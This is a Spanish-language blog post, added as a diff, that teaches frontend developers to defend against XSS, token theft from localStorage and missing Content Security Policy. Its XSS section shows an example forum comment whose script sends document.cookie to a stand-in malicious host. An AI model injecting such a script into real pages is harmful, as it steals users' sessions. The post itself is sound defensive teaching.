@@ -1,0 +1,82 @@
+---
+title: "Seguridad en el Frontend: Vulnerabilidades comunes y cómo evitarlas (XSS, CSRF)"
+publishedDate: 2026-06-24
+description: "Protege tus aplicaciones web desde el lado del cliente. Guía de ciberseguridad sobre XSS, CSRF, CSP y manejo seguro de tokens en el navegador."
+category: desarrollo
+tags:
+  - seguridad
+  - frontend
+  - js
+tech:
+  - js
+  - html
+draft: false
+---
+
+Existe un mito muy extendido en el desarrollo web: "El frontend no puede ser seguro, porque el código corre en el cliente y está expuesto. Deja que el backend se encargue de la seguridad". 
+
+Si bien es cierto que jamás debes validar información confidencial o precios única y exclusivamente en el cliente, el frontend es, de hecho, la principal línea de defensa contra ataques directos a los usuarios. Si dejas la puerta del navegador abierta, comprometes las cuentas de tus clientes sin que los atacantes tengan que tocar tu base de datos.
+
+Aquí tienes un repaso de las vulnerabilidades más críticas y cómo blindarte contra ellas como desarrollador Frontend.
+
+## 1. Cross-Site Scripting (XSS)
+
+Es, sin lugar a dudas, el rey de las vulnerabilidades web. Sucede cuando una aplicación web toma información ingresada por un usuario y la muestra en pantalla **sin antes sanearla** o neutralizarla.
+
+Imagina que tienes un foro, y un atacante escribe como comentario esto:
+```html
+¡Excelente post! <script>
+  fetch('https://servidor-maligno.com/robar?cookie=' + document.cookie);
+</script>
+```
+
+Si el frontend pinta ese HTML crudo, cada vez que un usuario lea ese comentario, su navegador ejecutará el script invisiblemente, robando su sesión.
+
+### Cómo evitar el XSS
+
+La buena noticia es que si utilizas frameworks modernos como React, Vue, Svelte o Astro, **estás protegido por defecto**. Al usar llaves o directivas (`{variable}` o `{{variable}}`), el framework escapa cualquier carácter peligroso antes de inyectarlo en el DOM.
+
+El problema surge cuando, por requerimiento, **necesitas** pintar HTML proveniente de un rich-text editor (como el artículo de un blog).
+
+- En React, se usa `dangerouslySetInnerHTML`. 
+- En Vue, `v-html`.
+
+**La regla de oro:** Jamás pintes HTML crudo directamente de la base de datos o de un usuario. Pásalo primero por una librería purificadora o saneadora (como DOMPurify) en el frontend, y que también se valide en el backend:
+
+```javascript
+import DOMPurify from 'dompurify';
+
+const htmlSucio = dataFromAPI;
+const htmlLimpio = DOMPurify.sanitize(htmlSucio);
+
+return <div dangerouslySetInnerHTML={{ __html: htmlLimpio }} />;
+```
+
+## 2. Robo de JWT (JSON Web Tokens) desde LocalStorage
+
+Donde guardamos el token que confirma que un usuario ha iniciado sesión es una decisión de arquitectura clave. El tutorial clásico de React dirá que lo guardes en el `localStorage`.
+
+El gran problema es que **cualquier script** en ejecución en tu página tiene acceso al `localStorage`. Si tu página es vulnerable a XSS (o instalaste una librería NPM maliciosa o comprometida que lee el localStorage y se lo envía a Rusia en segundo plano), perderás las sesiones de tus usuarios de forma masiva.
+
+### Dónde guardar los Tokens entonces
+
+La opción más segura en navegadores modernos es guardar el token de autenticación en una **Cookie HttpOnly, Secure y SameSite=Lax (o Strict)**. 
+
+- **HttpOnly:** El navegador retendrá la cookie en un cajón acorazado e impedirá rotundamente que ningún código JavaScript (ni tuyo ni de terceros) la lea.
+- **Secure:** Garantiza que solo viajará sobre HTTPS.
+- El servidor la envía en los headers del inicio de sesión, el navegador la guarda, y en cada petición posterior al backend, el navegador la adjuntará automáticamente sin que tú tengas que añadirla a mano en Axios/Fetch.
+
+## 3. Content Security Policy (CSP)
+
+Este es tu seguro de vida, la capa de blindaje definitivo. Una CSP es simplemente un Header HTTP enviado por tu servidor (o una meta-tag en tu `<head>`) que le da al navegador de tus usuarios una lista estricta de qué puede hacer y de dónde.
+
+Puedes configurarlo para dictar:
+- "Solo carga imágenes que vengan de nuestro dominio o de nuestro CDN oficial".
+- "Solo permite conexión a la API si va dirigida a api.midominio.com".
+- "Bajo NINGÚN CONCEPTO permitas ejecutar código JavaScript que no provenga de archivos `.js` verificados (bloqueando ejecución en línea y frenando el XSS mortalmente)".
+
+Implementar una CSP estricta da muchos quebraderos de cabeza durante el desarrollo, porque bloquea librerías como Google Analytics o scripts de terceros legítimos hasta que no los añadas explícitamente a la lista blanca. Pero una vez la configuras, te permite dormir profundamente de noche, sabiendo que si tienes una brecha en tu código, el navegador bloqueará al atacante antes de que extraiga datos.
+
+## Conclusión
+
+El Frontend Development no trata solamente sobre alinear cajas y poner gradientes bonitos. Somos guardianes de la puerta de entrada principal. Entender los vectores de ataque nos permite construir infraestructuras en las que los usuarios y las empresas puedan confiar de verdad.
